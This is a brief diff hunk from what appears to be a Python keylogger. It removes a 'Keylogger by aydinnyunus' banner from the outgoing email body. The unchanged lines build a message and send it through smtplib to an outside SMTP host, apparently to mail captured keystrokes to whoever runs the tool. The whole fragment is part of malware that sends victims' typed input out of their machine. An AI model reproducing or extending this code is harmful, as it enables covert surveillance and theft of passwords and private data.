@@ -69,7 +69,7 @@ finally:
             To: {receiver}
             From: {sender}
 
-            Keylogger by aydinnyunus\n"""
+            \n"""
 
             m += message
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
